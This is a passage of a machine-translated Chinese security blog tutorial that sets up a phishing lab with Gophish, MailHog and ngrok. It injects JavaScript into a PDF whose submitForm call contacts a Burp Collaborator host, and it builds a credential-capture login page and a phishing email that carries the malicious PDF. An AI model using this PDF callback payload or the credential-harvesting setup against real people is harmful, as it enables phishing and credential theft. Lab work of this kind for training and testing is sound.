<html>
<head>
<title>Phishing: Creating and Analyzing</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">网络钓鱼:创建和分析</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/phishing-creating-and-analyzing-ed73e5fec7b6?source=collection_archive---------1-----------------------#2022-02-12">https://infosecwriteups.com/phishing-creating-and-analyzing-ed73e5fec7b6?source=collection_archive---------1-----------------------#2022-02-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/48d3d65b9046a40f10e0dd513c67c37a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/0*dazEhG735J4GdlE8.png"/></div></figure><p id="fb68" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">大家好，</p><p id="d95c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这个博客里，我要钓鱼。直接得出结论是没有意义的，所以我将从“如何创造”到“如何做”来解释。</p><p id="4c30" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">下面是我要用来完成这项任务的要点:</p><ol class=""><li id="c3e7" class="ks kt iq jw b jx jy kb kc kf ku kj kv kn kw kr kx ky kz la bi translated">码头工人</li><li id="d0e1" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">Gophish</li><li id="b045" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">邮件猪</li><li id="b276" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">示例pdf文件</li><li id="b271" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">JS2PDFInjector</li><li id="f801" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">peepdf</li><li id="1751" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">pdfid</li><li id="7b60" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">雷姆努</li></ol><p id="0d71" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用docker的目的既是为了学习，也是为了轻松。</p><p id="18d5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">为了提高服务Gophish和Mailog，我在docker YAML文件中定义了它们。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="bf20" class="lp lq iq ll b gy lr ls l lt lu">services:<br/>  gophish:<br/>    image: "gophish/gophish"<br/>    ports:<br/>      - "3333:3333"<br/>  mailhog:<br/>    image: "mailhog/mailhog"<br/>    ports: <br/>      - "1025:1025"<br/>      - "8025:8025" <br/>    depends_on:<br/>        - gophish</span></pre><h1 id="332e" class="lv lq iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated"><strong class="ak">创建</strong></h1><p id="639e" class="pw-post-body-paragraph ju jv iq jw b jx ms jz ka kb mt kd ke kf mu kh ki kj mv kl km kn mw kp kq kr ij bi translated"><strong class="jw ir">概述</strong></p><p id="d7ea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">首先，我将把恶意的js代码注入一个pdf文件。然后我会用附加的恶意pdf文件钓鱼。我还将创建一个假的登录页面，并捕获受害者提交的凭据。</p><h2 id="4b0b" class="lp lq iq bd lw mx my dn ma mz na dp me kf nb nc mi kj nd ne mm kn nf ng mq nh bi translated">步骤1:创建恶意pdf文件</h2><p id="1e5b" class="pw-post-body-paragraph ju jv iq jw b jx ms jz ka kb mt kd ke kf mu kh ki kj mv kl km kn mw kp kq kr ij bi translated">我使用JS2PDFInjector将一个简单的恶意JS代码注入一个pdf文件。链接:【https://github.com/cornerpirate/JS2PDFInjector T4】</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nj"><img src="../Images/8b2295d92b29a6caf967a7603574da2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4c2uUgYplT5qglncdblQiQ.png"/></div></div></figure><p id="2b1a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这将在pdf阅读器上打开文件时弹出警告。不是所有的pdf阅读器都会执行代码。Adobe Acrobat包含读取js代码的API。在这篇博客中，我们将使用acrobat进行概念验证。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="856d" class="lp lq iq ll b gy lr ls l lt lu">app.alert("alter alert");<br/>this.submitForm('<a class="ae ni" href="http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net'" rel="noopener ugc nofollow" target="_blank">http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net'</a>);</span></pre><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi no"><img src="../Images/aa8410803e73a8d11990726c4e09e012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Xs8vHLFj0OCf6tJpVlGtYA.png"/></div></div><figcaption class="np nq gj gh gi nr ns bd b be z dk translated">将代码注入sample.pdf文件</figcaption></figure><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="1c0e" class="lp lq iq ll b gy lr ls l lt lu"><strong class="ll ir">java</strong> -jar JS2PDFInjector-1.0.jar $(pwd)/sample.pdf app.js</span></pre><p id="ffae" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">记住:您需要提供pdf的绝对路径。否则，您将会遇到如下图所示的错误。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/a4a201d7dad92fb258b0b5f1e25aa7fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z4_VXcHJqq3FiEniFP63qg.png"/></div></div></figure><h2 id="c4c7" class="lp lq iq bd lw mx my dn ma mz na dp me kf nb nc mi kj nd ne mm kn nf ng mq nh bi translated">步骤2:创建网络钓鱼活动</h2><p id="660c" class="pw-post-body-paragraph ju jv iq jw b jx ms jz ka kb mt kd ke kf mu kh ki kj mv kl km kn mw kp kq kr ij bi translated">从我们添加了两个服务<strong class="jw ir"> Gophish </strong>和<strong class="jw ir"> Mailhog </strong>的compose文件开始。</p><p id="82c6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><a class="ae ni" href="https://getgophish.com" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> Gophish </strong> </a>是一款为企业和渗透测试人员设计的开源钓鱼工具包。它提供了快速、轻松地设置和执行网络钓鱼服务和安全意识培训的能力。”</p><p id="a9dc" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> MailHog </strong>创建假的SMTP服务器用于测试目的。</p><p id="6b3f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">把前面提到的docker文件旋转起来。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nu"><img src="../Images/f01bb101578ba40e04c5e4143c66a63d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9PVWx_yH5dpsTjOy4rIeLA.png"/></div></div></figure><p id="0351" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> gophish </strong>服务器暴露于端口3333。默认用户名为“<strong class="jw ir"> admin </strong>”，密码为“<strong class="jw ir"> gophish </strong>”。但是，默认密码不会匹配，因为docker的密码在每次启动服务时都是不同且唯一的。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="b52e" class="lp lq iq ll b gy lr ls l lt lu"><strong class="ll ir">docker</strong> run -it --rm -p 3333:3333 gophish/gophish</span></pre><p id="9139" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果你没有使用排版工具，我建议你在前台模式下运行。控制台将以前台模式显示标准输出、输入和错误。以分离模式运行将隐藏所有这些文件处理过程日志。</p><p id="3f9c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">滚动一下就能得到密码。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nv"><img src="../Images/02c2371d58233b98c802ac3564c1af79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YWKzOVvLYPz0qg3dinLDEw.png"/></div></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nw"><img src="../Images/255fa6aebb2512753ca433bdc7701182.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OVpc-5a1WmzojvZ4o8VcEA.png"/></div></div></figure><p id="bc25" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">更改密码。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nx"><img src="../Images/8bd366ee247c23a7cdc12a2569d4f882.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wgbwM_6NAm8D-MCiKKjZJA.png"/></div></div></figure><p id="19fa" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们已经登录了。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ny"><img src="../Images/576157755a1742266e9ff01f38bb59de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DwzCIzpN8VOgRRBXo-81wQ.png"/></div></div></figure><p id="f35e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">为什么我们不先测试一下我们的SMTP服务器是否正常工作？</p><p id="bdf3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">至于发邮件，我们需要一个SMTP服务器。这种协议广泛用于发送、接收或转发外发电子邮件。</p><p id="9a22" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">发送配置文件</strong>是我们配置SMTP服务器的地方。我们使用<strong class="jw ir">邮件猪</strong>来测试SMTP服务器。它是免费的，非常容易使用。</p><p id="20e9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> Mailhog </strong>将SMTP服务器绑定到地址0.0.0。:1025.</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nz"><img src="../Images/90fb9c1d4fa50cd1f07495b1b095e618.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FKZW05IWmPzE-p2Mz5qWOw.png"/></div></div></figure><p id="d1c7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">它还提供了<strong class="jw ir"> GUI </strong>,在那里它存储发出的电子邮件并显示连接。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oa"><img src="../Images/c9b18a9dca1a8be0f311efcbbc525862.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GIfciyPKXeJX6j9pJqeUXQ.png"/></div></div></figure><ol class=""><li id="1cef" class="ks kt iq jw b jx jy kb kc kf ku kj kv kn kw kr kx ky kz la bi translated"><strong class="jw ir">发送配置文件</strong></li></ol><p id="4bef" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">创建新的<strong class="jw ir">发送配置文件</strong>。写上名字。“<strong class="jw ir">phish-test@mail.com</strong>”是我要发送邮件的邮件。在主机中，我们需要用SMTP服务器来填充它。我已经提供了由<strong class="jw ir"> mailhog </strong>暴露的SMTP绑定地址，即<strong class="jw ir"> 0.0.0.0:8025 </strong></p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/f40e57629cf2f4a18c30554f8b3d1097.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/1*kPY7LH_JrTI3kbQUPv-bbw.png"/></div></figure><p id="8a3a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我正在向测试邮箱“hello-testme@mail.com”发送邮件。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oc"><img src="../Images/fd7d78fd7a67e139755c57c8e3aeca92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q-0nbb5tOHuZIKpSR0J3Kw.png"/></div></div></figure><p id="6870" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">点击“发送”按钮。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi od"><img src="../Images/c18173d0f8a1394c0eeaac614d5bac39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XYi-o2X1HaWthxgqvdKURg.png"/></div></div></figure><p id="4062" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如您所见，它抛出了一个错误。它无法连接到<strong class="jw ir">邮箱</strong>。</p><p id="9f09" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">不使用docker就不用面对这个问题了。</p><p id="0f96" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我认为没有建立连接的原因是因为运行在不同的容器上。为了使它成功，我们必须连接分配给它的IP，而不是绑定地址。如果在<strong class="jw ir"> a桥</strong>网络中，容器可以在同一个主机中相互通信。它是默认的网络，提供了docker容器之间相互通信的可访问性。</p><p id="8d4c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">请注意为网络钓鱼服务创建的网络id。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/3cd70de08b25880347b523925dd6b478.png" data-original-src="https://miro.medium.com/v2/resize:fit:1288/format:webp/1*b3bvlCagMV6HvvSXk_RHJg.png"/></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi of"><img src="../Images/e890f170409636685d083467e70c506e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eV9k8-QHO_UA4_pAnPWBbw.png"/></div></div></figure><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="6fa9" class="lp lq iq ll b gy lr ls l lt lu"><strong class="ll ir">docker</strong> network ls<strong class="ll ir"><br/>docker</strong> network inspect fcff01c8be6a<br/><strong class="ll ir">docker</strong> network inspect bridge</span></pre><p id="4ccc" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们找到分配给它的网络IP。两个容器都有一个网关。但是为了更早地解决问题，我们必须获得分配给容器<strong class="jw ir"> mailhog的IP。</strong></p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi gj"><img src="../Images/c998304499b2abb3ab7de80a1e04a38a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J1PUi1PJbc_5K13jwUctLw.png"/></div></div></figure><p id="d8fd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">滚动直到我们找到分配给该容器的IP。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi og"><img src="../Images/f1ebff4ceb1bc0df86f7288f7a6414bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NDK7y7ev7ZBJxxHoN9qvAw.png"/></div></div></figure><p id="6215" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们用上面的IP试试。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/612f345ac1c068beafb3f1430141adae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1194/format:webp/1*0DHU9gmEnc51fBrGlQzzxg.png"/></div></figure><p id="1809" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">电子邮件已成功发送。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oi"><img src="../Images/a3a5101873c34c4765931dddba2d7711.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cs-2OCLIKSqOlYyQ6ZITtQ.png"/></div></div></figure><p id="3588" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们收到了。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oj"><img src="../Images/c0478ea50ac6ce35bdab10f5470e0a68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tGfO3HuaORUR49uE8P0MJQ.png"/></div></div></figure><p id="9ac1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，保存配置文件。</p><p id="9a54" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> 2。登陆页面</strong></p><p id="bb77" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">登录页面是当受害者单击攻击者创建的链接时向其显示的页面。网页可以是任何容易吸引受害者的东西。比如抽奖页面，紧急密码重置页面等。如果你欺骗了某人，那么你可以从他/她那里得到任何东西。作为一个攻击者，你在制作登陆页面的时候也应该非常有创意。如果网页看起来不吸引人，受害者上当的机会就更少。</p><p id="a169" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">看看下面这一页，谁会上当呢？没人。</p><p id="91b5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">对于这个博客，我会继续下去。这是一个简单的登录页面。</p><p id="c908" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我将记录目标电子邮件用户提交的用户名和密码。</p><p id="aaeb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我还会附上我们之前创建的pdf文件。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/268c8177b8e010833d1467dcb740d406.png" data-original-src="https://miro.medium.com/v2/resize:fit:772/format:webp/1*e8AuHc-4tvK4OaT30R04hQ.png"/></div></figure><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="72ad" class="lp lq iq ll b gy lr ls l lt lu">&lt;!DOCTYPE html&gt;<br/>&lt;html lang="en"&gt;<br/>&lt;head&gt;<br/>    &lt;meta charset="UTF-8"&gt;<br/>    &lt;title&gt;Right Now Nothing&lt;/title&gt;<br/>&lt;/head&gt;<br/>&lt;body&gt;<br/>    &lt;form method="post"&gt;<br/>        name: &lt;input name="username" &gt;&lt;br&gt;<br/>        pass: &lt;input name="password" &gt;&lt;br&gt;<br/>    &lt;input type="submit" value="submit"&gt;</span><span id="53a2" class="lp lq iq ll b gy ol ls l lt lu">&lt;/form&gt;<br/>    <br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="2c3f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我正在使用的HTML和PHP文件。</p><p id="c9a8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们在ngrok的帮助下创建了一个隧道。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="5749" class="lp lq iq ll b gy lr ls l lt lu"><strong class="ll ir">ngrok</strong> http 9002</span></pre><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi om"><img src="../Images/7244d9836c6c5431cde2648deca4ec39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VVZELzH_WTeG-zO_xbjS5Q.png"/></div></div></figure><p id="3a67" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们还必须启动本地服务器，否则它将无法创建隧道连接。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/92b207f99d9e8ccaa85dddb775716850.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/1*BE32LQwPo69272dluXNS7w.png"/></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oo"><img src="../Images/4f829a69410592cb3829cb64c26e7ec2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3_hwoRHj9EpPRXUI83_Clw.png"/></div></div></figure><p id="697d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们导入网站。放上ngrok创建的转发URL。</p><p id="e7da" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们甚至可以复制HTML内容，而不是导入它。两者都有各自的目的。它只会导入我们创建的静态页面。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi op"><img src="../Images/1aafc0008b680b846a20da6d60d2b335.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pVb03V43ANVrVJ9PJwyB0Q.png"/></div></div></figure><p id="99ea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">请注意，呈现了HTML页面。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/a8d5483878b90199e918a2b6b891a4cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1136/format:webp/1*YxAtDxMgYYPR5WmzBbjv-w.png"/></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/17041285fb1448e5d47bef2b8fb2401a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1022/format:webp/1*IgsaA8735cgKMqVssTpC7g.png"/></div></figure><p id="32d1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我还添加了一个重定向页面。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/c626bd8919d9555046741dfe61d23df2.png" data-original-src="https://miro.medium.com/v2/resize:fit:532/format:webp/1*YmwypI3YFuaxtslfIFRX6w.png"/></div></figure><p id="8a62" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">省省吧。您还可以修改和删除页面。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ot"><img src="../Images/43f67e4dc53fda9afbee5d9307727419.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*04NLt-g_K1gAmnmPg_Hrow.png"/></div></div></figure><p id="2f4c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> 3。电子邮件模板</strong></p><p id="8396" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">邮件模板</strong>是发送给邮件目标的内容。你可能已经注意到了Gmail中的邮件正文。电子邮件模板代表了这一点。这是你要发送给目标用户的正文内容。</p><p id="1bce" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我创建的钓鱼邮件内容的糟糕示例。XD <br/>你可以创造自己的。如果我是一个钓鱼者，我会失败得很惨。</p><p id="6cf6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们正在创建一个HTML模板。这样我们就可以插入HTML标签、元素等。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/bae6bfbd27b11cd44546f5e163b7a83a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1358/format:webp/1*ICtdk0BX4bLeoTesieqJcQ.png"/></div></figure><p id="36af" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><a class="ae ni" rel="noopener ugc nofollow" target="_blank" href="/{{.URL}}"> {{。URL}} </a>这将自动创建链接。它将是我们的gophish服务器IP。</p><p id="a231" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">{{.名字}}将显示目标电子邮件用户的名字。您将在“用户和组”部分看到这一点，我们必须添加要向其发起网络钓鱼活动的用户。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/31ed4d4f18d875b61d609dae409f8bc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:578/format:webp/1*vcs0lZw4rV_sOrqMm15coQ.png"/></div></figure><p id="b948" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">你可能也注意到了“添加跟踪图像”。它的目的是确保gophish知道用户何时打开电子邮件。</p><p id="3c69" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们已经成功创建了一个电子邮件模板。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ow"><img src="../Images/e7fddbd1c55c8ad69184f6e7f85c0186.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*90Hj74qgq6kN_E7R70Tnhg.png"/></div></div></figure><p id="cd00" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">忘记加附件了。我们来编辑一下。点击“添加文件”并选择pdf文件。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ox"><img src="../Images/e5434e53acac42b17bf6a4e483926731.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rGAZUBvG0i09uAB8UyGiDg.png"/></div></div></figure><p id="e2de" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们必须再次拯救它。</p><p id="1a1e" class="pw-post-body-paragraph ju jv 